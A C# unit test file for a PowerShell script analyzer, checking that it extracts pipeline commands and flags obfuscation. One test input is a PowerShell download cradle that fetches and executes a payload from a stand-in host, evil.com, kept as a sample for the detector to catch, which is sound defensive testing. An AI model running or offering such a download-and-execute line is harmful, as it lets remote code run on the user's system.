namespace Company.CMDPilot.PowerShell.UnitTests;

using Company.CMDPilot.PowerShell;
using FluentAssertions;

public class PowerShellAstAnalyzerTests
{
    [Fact]
    public void ExtractCommands_ShouldFindCommandsInPipeline()
    {
        // Arrange
        string script = "Get-Process | Where-Object WorkingSet -gt 100MB | Sort-Object WorkingSet -Descending";

        // Act
        var commands = PowerShellAstAnalyzer.ExtractCommands(script);

        // Assert
        commands.Should().HaveCount(3);
        commands.Should().ContainInOrder("Get-Process", "Where-Object", "Sort-Object");
    }

    [Fact]
    public void DetectObfuscation_ShouldDetectInvokeExpression()
    {
        // Arrange
        string script = "iex (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')";

        // Act
        var result = PowerShellAstAnalyzer.DetectObfuscation(script);

        // Assert
        result.Should().BeTrue();
    }

    [Fact]
    public void DetectObfuscation_ShouldDetectDynamicInvocation()
    {
        // Arrange
        string script = "$cmd = 'Write-Host'; & $cmd 'Hello'";

        // Act
        var result = PowerShellAstAnalyzer.DetectObfuscation(script);

        // Assert
        result.Should().BeTrue();
    }

    [Fact]
    public void DetectObfuscation_ShouldPassSafeScript()
    {
        // Arrange
        string script = "Get-Service | Where-Object Status -eq 'Running'";

        // Act
        var result = PowerShellAstAnalyzer.DetectObfuscation(script);

        // Assert
        result.Should().BeFalse();
    }
}
